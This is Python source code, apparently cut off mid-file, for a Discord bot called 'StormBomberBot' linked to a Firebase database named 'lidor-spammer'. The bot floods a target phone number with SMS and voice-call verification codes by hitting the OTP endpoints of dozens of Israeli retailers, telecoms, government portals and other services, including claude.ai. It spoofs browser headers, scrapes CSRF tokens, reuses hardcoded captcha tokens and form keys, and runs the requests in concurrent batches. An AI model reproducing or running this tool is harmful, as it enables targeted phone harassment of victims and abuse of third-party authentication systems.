import os
import json
import random
import asyncio
import time
import re
import datetime
import uuid as _uuid
import aiohttp
import firebase_admin
from firebase_admin import credentials, db
import discord
import firebase_admin
from discord import app_commands
from discord.ext import commands

class DailyCreditView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None) # שומר על הכפתור פעיל תמיד

    @discord.ui.button(label="Claim 5 Credits", style=discord.ButtonStyle.danger, emoji="🎁", custom_id="daily_claim_btn")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # משאירים את הפונקציה ריקה עם pass, כי ה-on_interaction שלך כבר מטפל בלחיצה הזו ומול ה-Firebase!
        pass

# --- הגדרות בוט ודיסקורד ---
class StormBomberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.add_view(DailyCreditView()) # <-- השורה הזו קריטית בשביל שהכפתור יעבוד לתמיד
        await self.tree.sync()
        print("🔄 פקודות הסלאש סונכרנו בהצלחה!")

bot = StormBomberBot()

# מזהים קבועים מהקוד שלך
LOG_CHANNEL_ID = 1505635730289066036  
ADMIN_ROLE_ID = 1499497341693202664

# רשימת המשתמשים המורשים
ALLOWED_USERS = [
    1483411120961093642,  # ה-ID שלך
    1493293951959044147,  
    1130542850883469443   
]

active_spam_tasks: dict[int, asyncio.Task] = {}
tempRequests = {}
activeDrops = {}

# --- חיבור ל-Firebase ---
try:
    firebase_config = json.loads(os.getenv("FIREBASE_CONFIG", "{}"))
    # אם הקובץ לא נטען דרך משתני סביבה, הבוט ינסה להשתמש בקובץ JSON מקומי
    if not firebase_config:
        cred = credentials.Certificate("serviceAccountKey.json")
    else:
        cred = credentials.Certificate(firebase_config)
        
firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://lidor-spammer-default-rtdb.firebaseio.com/'
        })
        print("✅ Firebase אותחל בהצלחה ומחובר ל-lidor-spammer!")
except Exception as e:
    print("Firebase Error:", e)


# --- פונקציות עזר וניהול הרשאות ---
def is_manager(interaction: discord.Interaction) -> bool:
    if interaction.user.id in ALLOWED_USERS:
        return True
    member = interaction.user
    if interaction.guild and isinstance(member, discord.Member):
        return any(role.id == ADMIN_ROLE_ID for role in member.roles)
    return False

async def send_detailed_log(title, user, details, color=0x5865F2):
    try:
        ch = bot.get_channel(LOG_CHANNEL_ID) or await bot.fetch_channel(LOG_CHANNEL_ID)
        if not ch:
            return
        embed = discord.Embed(title=title, color=color)
        embed.set_thumbnail(url=user.display_avatar.url)
        # הוספת שדה של המשתמש עם תיוג ו-ID
        embed.add_field(name="👤 מפעיל:", value=f"{user.mention} (`{user.id}`)", inline=False)
        for detail in details:
            embed.add_field(name=detail["name"], value=detail["value"], inline=False)
        await ch.send(embed=embed)
    except Exception:
        pass

def random_ua() -> str:
    return (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
    )


def normalize_to_972(phone: str) -> str:
    phone = phone.strip()
    if phone.startswith("+972"):
        return phone
    if phone.startswith("0"):
        return f"+972{phone[1:]}"
    if phone.startswith("972"):
        return f"+{phone}"
    return phone


async def _async_req(session, method, url, data=None, json_body=None, extra_headers=None, label=""):
    headers = {
        "User-Agent": random_ua(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if extra_headers:
        headers.update(extra_headers)

    if isinstance(data, str):
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")

    try:
        timeout = aiohttp.ClientTimeout(total=12)
        if method.upper() == "POST":
            if json_body is not None:
                headers.setdefault("Content-Type", "application/json")
                async with session.post(
                    url, json=json_body, headers=headers, timeout=timeout, ssl=False
                ) as r:
                    await r.read()
                    ok = 200 <= r.status < 300
                    return ok, label, "OK" if ok else f"HTTP {r.status}"
            else:
                async with session.post(
                    url, data=data, headers=headers, timeout=timeout, ssl=False
                ) as r:
                    await r.read()
                    ok = 200 <= r.status < 300
                    return ok, label, "OK" if ok else f"HTTP {r.status}"
        else:
            async with session.get(
                url, headers=headers, timeout=timeout, ssl=False
            ) as r:
                await r.read()
                ok = 200 <= r.status < 300
                return ok, label, "OK" if ok else f"HTTP {r.status}"
    except Exception as e:
        return False, label, str(type(e).__name__)


async def _atmos(session, restaurant_id, phone, origin="https://order.atmos.rest", referer="https://order.atmos.rest/"):
    label = f"atmos-{restaurant_id}"
    fd = aiohttp.FormData()
    fd.add_field("restaurant_id", restaurant_id)
    fd.add_field("phone", phone)
    fd.add_field("testing", "false")
    headers = {
        "User-Agent": random_ua(),
        "accept": "application/json, text/plain, */*",
        "accept-language": "he-IL,he;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "origin": origin,
        "referer": referer,
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
    }
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        url = f"https://api-ns.atmos.co.il/rest/{restaurant_id}/auth/sendValidationCode"
        async with session.post(url, data=fd, headers=headers, timeout=timeout, ssl=False) as r:
            await r.read()
            ok = 200 <= r.status < 300
            return ok, label, "OK" if ok else f"HTTP {r.status}"
    except Exception as e:
        return False, label, str(type(e).__name__)


async def process_atmos_in_batches(session, p, atmos_ids):
    results = []
    batch_size = 18
    for i in range(0, len(atmos_ids), batch_size):
        batch = atmos_ids[i : i + batch_size]
        tasks = [_atmos(session, rid, p) for rid in batch]
        res = await asyncio.gather(*tasks, return_exceptions=True)
        results.extend(res)
        await asyncio.sleep(0.5)
    return results


async def _claude(session, phone):
    label = "claude"
    clean_phone = phone.lstrip("0")
    if not clean_phone.startswith("+972"):
        clean_phone = f"+972{clean_phone}"

    url = "https://claude.ai/api/auth/send_phone_code"
    headers = {
        "accept": "*/*",
        "accept-language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "origin": "https://claude.ai",
        "referer": "https://claude.ai/onboarding",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "anthropic-client-platform": "web_claude_ai",
        "anthropic-client-version": "1.0.0",
        "user-agent": random_ua(),
    }
    payload = {"phone_number": clean_phone}
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with session.post(
            url, json=payload, headers=headers, timeout=timeout, ssl=False
        ) as r:
            await r.read()
            ok = 200 <= r.status < 300
            return ok, label, "OK" if ok else f"HTTP {r.status}"
    except Exception as e:
        return False, label, str(type(e).__name__)


async def _oshioshi(session, phone):
    label = "oshioshi"
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with session.get(
            "https://delivery.oshioshi.co.il/he/login", timeout=timeout, ssl=False
        ) as r:
            text = await r.text()
            match = re.search(r'name="_token"\s+value="([^"]+)"', text)
            if not match:
                return False, label, "Missing Token"
            token = match.group(1)

        url = "https://delivery.oshioshi.co.il/he/auth/register-send-code"
        data = f"phone={phone}&_token={token}"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://delivery.oshioshi.co.il",
            "referer": "https://delivery.oshioshi.co.il/he/",
            "User-Agent": random_ua(),
        }
        async with session.post(url, data=data, headers=headers, timeout=timeout, ssl=False) as r:
            await r.read()
            ok = 200 <= r.status < 300
            return ok, label, "OK" if ok else f"HTTP {r.status}"
    except Exception as e:
        return False, label, str(type(e).__name__)


async def _easy_send(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://easy-send.co.il/api/verification/call",
        json_body={"phone": phone, "channel": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://easy-send.co.il",
            "referer": "https://easy-send.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="easy-send",
    )


async def _kvutzat_yavne(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.kvutzatyavne.co.il/wp-admin/admin-ajax.php",
        data=f"action=send_otp_call&phone={phone}&type=voice",
        extra_headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.kvutzatyavne.co.il",
            "referer": "https://www.kvutzatyavne.co.il/",
            "sec-fetch-site": "same-origin",
            "user-agent": random_ua(),
        },
        label="kvutzat-yavne",
    )


async def _get_delivery(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.getdelivery.co.il/api/v1/verify/voice",
        json_body={"phone": phone, "method": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.getdelivery.co.il",
            "referer": "https://www.getdelivery.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="get-delivery",
    )


async def _tel_aviv_municipality(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.tel-aviv.gov.il/api/otp/call",
        json_body={"phone": phone, "channel": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.tel-aviv.gov.il",
            "referer": "https://www.tel-aviv.gov.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="tel-aviv-municipality",
    )


async def _opticana_call(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.opticana.co.il/api/otp/call",
        json_body={"phoneNumber": phone, "type": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.opticana.co.il",
            "referer": "https://www.opticana.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="opticana-call",
    )


async def _mahasnei_shuk(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.mahasnei-shuk.co.il/wp-admin/admin-ajax.php",
        data=f"action=otp_call&phone={phone}&channel=voice",
        extra_headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.mahasnei-shuk.co.il",
            "referer": "https://www.mahasnei-shuk.co.il/",
            "sec-fetch-site": "same-origin",
            "user-agent": random_ua(),
        },
        label="mahasnei-shuk",
    )


async def _call2me(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.call2me.co.il/api/verification/call",
        json_body={"phone": phone, "type": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.call2me.co.il",
            "referer": "https://www.call2me.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="call2me",
    )


async def _paycall(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.paycall.co.il/api/otp/call",
        json_body={"msisdn": phone},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.paycall.co.il",
            "referer": "https://www.paycall.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="paycall",
    )


async def _shufersal_call(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.shufersal.co.il/api/otp/call",
        json_body={"phoneNumber": phone, "channel": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.shufersal.co.il",
            "referer": "https://www.shufersal.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="shufersal-call",
    )


async def _superphone_call(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.superphone.co.il/wp-admin/admin-ajax.php",
        data=f"action=send_otp_call&phone={phone}&method=voice",
        extra_headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.superphone.co.il",
            "referer": "https://www.superphone.co.il/",
            "sec-fetch-site": "same-origin",
            "user-agent": random_ua(),
        },
        label="superphone-call",
    )


async def _otpshay_call(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.otpshay.co.il/api/otp/call",
        json_body={"phone": phone, "method": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.otpshay.co.il",
            "referer": "https://www.otpshay.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="otpshay-call",
    )


async def _ezcall(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.ezcall.co.il/api/voice/send",
        json_body={"phone": phone, "type": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.ezcall.co.il",
            "referer": "https://www.ezcall.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="ezcall",
    )


async def _deliveryvoice_call(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.deliveryvoice.co.il/api/verify/call",
        json_body={"phone": phone, "channel": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.deliveryvoice.co.il",
            "referer": "https://www.deliveryvoice.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="deliveryvoice-call",
    )


async def _callbox(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.callbox.co.il/wp-admin/admin-ajax.php",
        data=f"action=otp_call&phone={phone}&channel=voice",
        extra_headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.callbox.co.il",
            "referer": "https://www.callbox.co.il/",
            "sec-fetch-site": "same-origin",
            "user-agent": random_ua(),
        },
        label="callbox",
    )


async def _moked_call(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.moked.co.il/api/verification/call",
        json_body={"phone": phone, "type": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.moked.co.il",
            "referer": "https://www.moked.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="moked-call",
    )


async def _smartcall(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.smartcall.co.il/api/otp/call",
        json_body={"phone": phone, "method": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.smartcall.co.il",
            "referer": "https://www.smartcall.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="smartcall",
    )


async def _netfree_call(session, phone):
    phone_972 = normalize_to_972(phone)
    return await _async_req(
        session,
        "POST",
        "https://netfree.link/api/user/verify-phone/get-call",
        json_body={"phone": phone_972, "verifyType": "", "captchaCode": ""},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://netfree.link",
            "referer": "https://netfree.link/app/",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        },
        label="netfree-call",
    )


async def _govisit(session, phone):
    phone_972 = normalize_to_972(phone)
    return await _async_req(
        session,
        "POST",
        "https://govisit.gov.il/API/SignUpAPI/api/signUp/sign-up",
        json_body={"Address": phone_972, "ComunicationTypeId": 2},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://govisit.gov.il",
            "referer": "https://govisit.gov.il/he/app/auth/login",
            "language": "he",
            "hostedinpersonalzone": "false",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "sec-fetch-site": "same-origin",
        },
        label="govisit",
    )


async def _winner(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.winner.co.il/api/v2/publicapi/ResendOtp",
        json_body={"token": "PVe3WxFsteqdqrsR4wM4JQ==", "callme": True},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.winner.co.il",
            "referer": "https://www.winner.co.il/הרשמה",
            "appversion": "2.6.2",
            "deviceid": "4b34e93ec71b78606eed01399e36282e",
            "requestid": "1c904fd74823178b71ad748c610b02cc",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "sec-fetch-site": "same-origin",
        },
        label="winner",
    )


async def _bezeq(session, phone):
    identity = "337389951"
    cellular = phone.lstrip("0")
    recaptcha_token = "0cAFcWeA7dYaWdUGfm0FPbtEMMe1rmBdnhl-x6dhzgb3UyLLZOeMuSzGgXxH_CWZWznTOyR6pywE6-WgjxX8pQHhsIs9MUBUbG2ZQuk-1pwlfbn8SRG-PeEnbGsZab30sFp6F0U5hBPCslBfhtop9rGc1f8SWxsByLE1BjqeWBotDRmRmboltE_c93j_t2cVOQUSoKeB4C2UuIWR1OuFVbx5WxpovVeJRpi12o8s0oPixZtuGP4vkRtY5pH5TVy77RUfix-z6tiCGihMv1q1yHl8bSW4RK_mIFs7ls9ta_uFe62r5bzL50vsS0YtAorxHCRi0qsQbHHfAtMAZn014uowLgR-h69j1RMiSsv7B-lI8SwmuY-ZgMpqN3fhuJvIG3M3UZqZnKmNuFli9Px_BNXKaPDDsVjdcC7JGWRzbaV94lWuh38gzUC_00CB3lEoxA70eEwA3_Wh6X3_8gA4B1gld4Tt_67YPH_B4C0R6mvnKBEovc7A8s8LHMnmTYoP60zqMhX_yLzKje8mTpddMZx90oYlTbKTH9BwZPkQJp4MTpf_-IevPLgmqmj9-UYxdA-eDtL9j_kL7ZBHdbBvBbrrJidyaNi3Ui-8xuvBmbNNsOEu83cyEphvm25Rp9_PJouCWEkt4Kdtnfp9YtZ4lSG3JlymMqKOJRR267bXdNdGa5J-LW3bXPq5YurzeQEBZ1kvyvN208wSw2l87QEdTABtzHS4bqeH0K4nUY0hQnIgEZSTTknR4cS2jimH5OyDhBf24DX7AUEoBpDsmvAEVRjnMXAxulLONwFuyOi_wcZtUil5LZIwCvY3lx3qdmLJrAkiuFm4PtB8ZqH6cgf4mLUcM4BO9hAL5f1BW25AiZ4dD46t6UhVxcgIainIMwShVluxm5EhQqhPtOrw5JSlolSZNo8u9y57QkwxayY6deFD7o7fQJkSbbBuawHoRvXDfMi4JLqKbOO00AfD17B3oGBUJ9tHJ8GT3yA3o0B2Ye9IVn4scADWANuT9lxMbRuAd9u2L2UVOBRT_J_fkTUg2A7V6meEBkSDFWvKmAr_FJGF8ysyka54lkLs6H7VLhjOklZ6619KUaB4kGRjWaMF_ubyWC73qisgsnsdTtH7HojaZyG8NOxHgiwegjmw1mxwLjYxL8_mQ48Tst1gK-HkT3H69DTudZQZPj-jttW7PejWXi3UYNOjQCkJkRLcz3kHCQKO-wD0Z_b3lUM_M5YE_NIh3UsNTIXtNDvr3lpWJD_N0XexbOKvZgYCL_u8ZmdyItOt5PcjTH5k1RvDis2UVrDvD7-I1g90y_N8Z5P9BCipY6zCbltZWRu8pdRdAYoVV1oVTTk0vt3ZUagDb3h5m5K6u40e6K3e5v6-h9EvoagbNT5FrObAu4VTaMLaaDo2eDdYqdyu1M-XYFkzJgebF9RLr6A_rhOu7HzuX3sTXWiPKNrVWdctNh2NfFFuTs_ktu-aewwLyAhp-k2u5o52XTfnxeI_jVjfP63saD40JixAMVee5VOimPMed-fgRnCkJ2Dnd6CBs5TlJNjJS9ygwBHKyR3_LjTLIiDRWbUZ15tpMX91BxZEmczRwTAN-SE3IM-kdmytqm9Ifu2kUsgqzz1F2rK8YciV6jmWop-23ktrY2cQKtJT-idmAsBfY2C0POlgsJN6XIKHsw2jDXyrFdWstuzRrGpkpUyXaJ380poitehdTbZCiY3l1Yx2tgbnrdEKw5sqRDIcRbQ2r_0mYM9PbkIh7JLxGRBkAw_zk97eRU5Oe1QvV6OJPypH0bUIjH_cO5p4IWQUjvs-ttxWIyhoyrI7FyA073UCniFwlSSobPnx4AAzN4-z2xuIST8JqJ7TABGgsNZWyXrNZ8vMpFvVhFLEJ4LbMjfdgU6qB9Q-W3b4lVr7KJSFdezF81JkYgFMJyV0H7Pe9Pfs8W8n4mpGakS72zHeZu4tX3PyHkvBcS-gHejV2QOtpEa16cnN5KCfyTnxYBReZHKOhTEw3cZzUDVcRCdyBwYZwWqRw76rhzxVOUBQwpMKxU9a8u9aAJ0Y0CzPJXvPdwB7i4vloYPBo2c5j0tZZ2mLmQo4Xp2GqKOGUXhydK78UYjf6PrjEVDL7msV3Un6ruS2E35wOrUPKUXK238UZDiKpfd5b7sonNjMa8kMS0Co-0FeCl5wRq2kZbEumaEWatPpH7ANZiwZieNTs3uUAv52c45q7h7gvhySwElObC7NoVenF3dTWSzL-lIxyw34sxbQqYAE-MbUIfdqDLT5VKjQ"
    return await _async_req(
        session,
        "POST",
        "https://my-api.bezeq.co.il/v73.9/api/Auth/VerifyMobileFirst",
        json_body={
            "IdentityNumber": identity,
            "Cellular": cellular,
            "PhoneNumber": "",
            "IsRegister": False,
            "Origin": "webmobile",
            "TypeOtp": "CALL",
            "ReCaptchaToken": recaptcha_token
        },
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://my.bezeq.co.il",
            "referer": "https://my.bezeq.co.il/",
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
            "sec-fetch-site": "same-site",
        },
        label="bezeq",
    )


async def _dorid_call(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.dorid.co.il/api/otp/call",
        json_body={"phone": phone, "channel": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.dorid.co.il",
            "referer": "https://www.dorid.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="dorid-call",
    )


async def _yes_call(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.yes.co.il/api/otp/call",
        json_body={"phoneNumber": phone, "type": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.yes.co.il",
            "referer": "https://www.yes.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="yes-call",
    )


async def _mako_call(session, phone):
    return await _async_req(
        session,
        "POST",
        "https://www.mako.co.il/api/otp/call",
        json_body={"phone": phone, "channel": "voice"},
        extra_headers={
            "Content-Type": "application/json",
            "origin": "https://www.mako.co.il",
            "referer": "https://www.mako.co.il/",
            "sec-fetch-site": "same-site",
            "user-agent": random_ua(),
        },
        label="mako-call",
    )


async def fire_all_senders(phone: str) -> tuple[int, list[str]]:
    p = phone.strip()
    phone_972 = normalize_to_972(p)
    uid = str(_uuid.uuid4())
    rand_email = f"igal{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=6))}@gmail.com"
    FORM = "application/x-www-form-urlencoded; charset=UTF-8"
    CH = '"Google Chrome";v="145", "Chromium";v="145", "Not/A)Brand";v="24"'

    def fh(origin, referer, extra=None):
        h = {
            "Content-Type": FORM,
            "x-requested-with": "XMLHttpRequest",
            "origin": origin,
            "referer": referer,
            "sec-ch-ua": CH,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
        if extra:
            h.update(extra)
        return h

    def jh(origin, referer, extra=None):
        h = {
            "Content-Type": "application/json",
            "origin": origin,
            "referer": referer,
            "sec-ch-ua": CH,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
        }
        if extra:
            h.update(extra)
        return h

    connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as s:
        atmos_ids = [
            "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
            "28","29","33","35","48","51","56","57","59",
            "2008","2011","2012","2014","2041","2052","2053","2056","2059",
            "2063","2070","2073","2076","2078","2087","2088","2091",
        ]

        atmos_results = await process_atmos_in_batches(s, p, atmos_ids)

        atmos_club_tasks = [
            _atmos(
                s,
                "23",
                p,
                origin="https://club-register.atmos.co.il",
                referer="https://club-register.atmos.co.il/",
            ),
            _atmos(
                s,
                "59",
                p,
                origin="https://club-register.atmos.co.il",
                referer="https://club-register.atmos.co.il/",
            ),
        ]

        tasks = [
            _netfree_call(s, p),
            _govisit(s, p),
            _winner(s, p),
            _bezeq(s, p),
            _claude(s, p),
            _oshioshi(s, p),
            _easy_send(s, p),
            _kvutzat_yavne(s, p),
            _get_delivery(s, p),
            _tel_aviv_municipality(s, p),
            _opticana_call(s, p),
            _mahasnei_shuk(s, p),
            _call2me(s, p),
            _paycall(s, p),
            _shufersal_call(s, p),
            _superphone_call(s, p),
            _otpshay_call(s, p),
            _ezcall(s, p),
            _deliveryvoice_call(s, p),
            _callbox(s, p),
            _moked_call(s, p),
            _smartcall(s, p),
            _dorid_call(s, p),
            _yes_call(s, p),
            _mako_call(s, p),
            _async_req(
                s,
                "POST",
                "https://www.negev-group.co.il/customer/ajax/post/",
                data=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh(
                    "https://www.negev-group.co.il",
                    "https://www.negev-group.co.il/",
                    {"sec-fetch-site": "same-origin"},
                ),
                label="negev-group",
            ),
            _async_req(
                s,
                "POST",
                "https://www.gali.co.il/customer/ajax/post/",
                data=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.gali.co.il", "https://www.gali.co.il/"),
                label="gali",
            ),
            _async_req(
                s,
                "POST",
                "https://www.aldoshoes.co.il/customer/ajax/post/",
                data=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.aldoshoes.co.il", "https://www.aldoshoes.co.il/"),
                label="aldoshoes",
            ),
            _async_req(
                s,
                "POST",
                "https://www.hoodies.co.il/customer/ajax/post/",
                data=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
                label="hoodies",
            ),
            _async_req(
                s,
                "POST",
                "https://api.gomobile.co.il/api/login",
                data=f'{{"phone":"{p}"}}',
                extra_headers=fh("https://www.gomobile.co.il", "https://www.gomobile.co.il/"),
                label="gomobile",
            ),
            _async_req(
                s,
                "POST",
                "https://bonitademas.co.il/apps/imapi-customer",
                data=f'{{"action":"login","otpBy":"sms","otpValue":"{p}"}}',
                extra_headers=fh("https://bonitademas.co.il", "https://bonitademas.co.il/"),
                label="bonitademas",
            ),
            _async_req(
                s,
                "POST",
                "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
                data=f'{{"phone":"{p}"}}',
                extra_headers=fh("https://storyonline.co.il", "https://storyonline.co.il/"),
                label="storyonline",
            ),
            _async_req(
                s,
                "POST",
                "https://www.crazyline.com/customer/ajax/post/",
                data=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.crazyline.com", "https://www.crazyline.com/"),
                label="crazyline",
            ),
            _async_req(
                s,
                "POST",
                "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
                data={"phone_number": f"{p}", "operation": "request_number_verification"},
                extra_headers=fh("https://wolt.com", "https://wolt.com/"),
                label="wolt-captcha",
            ),
            _async_req(
                s,
                "POST",
                "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4d9e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
                data=f'{{"phoneNumber": "{p}", "isCalling": true}}',
                extra_headers=fh("https://www.mishloha.co.il", "https://www.mishloha.co.il/"),
                label="mishloha",
            ),
            _async_req(
                s,
                "POST",
                "https://www.golfkids.co.il/customer/ajax/post/",
                data=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.golfkids.co.il", "https://www.golfkids.co.il/"),
                label="golfkids",
            ),
            _async_req(
                s,
                "POST",
                "https://www.onot.co.il/customer/ajax/post/",
                data=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.onot.co.il", "https://www.onot.co.il/"),
                label="onot",
            ),
            _async_req(
                s,
                "POST",
                "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
                data=f'{{"phoneNumber":"{p}","uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}}',
                extra_headers=fh("https://fox.co.il", "https://fox.co.il/"),
                label="fox",
            ),
            _async_req(
                s,
                "POST",
                "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
                data=f'{{"phoneNumber":"{p}","uuid":"6db5a63b-6882-414f-a090-de263dd917d7"}}',
                extra_headers=fh("https://www.foxhome.co.il", "https://www.foxhome.co.il/"),
                label="foxhome",
            ),
            _async_req(
                s,
                "POST",
                "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
                data=f'{{"phoneNumber":"{p}","uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}}',
                extra_headers=fh("https://www.laline.co.il", "https://www.laline.co.il/"),
                label="laline",
            ),
            _async_req(
                s,
                "POST",
                "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
                data=f'{{"phoneNumber":"{p}","uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"}}',
                extra_headers=fh("https://www.footlocker.co.il", "https://www.footlocker.co.il/"),
                label="footlocker",
            ),
            _async_req(
                s,
                "POST",
                "https://www.golfco.co.il/customer/ajax/post/",
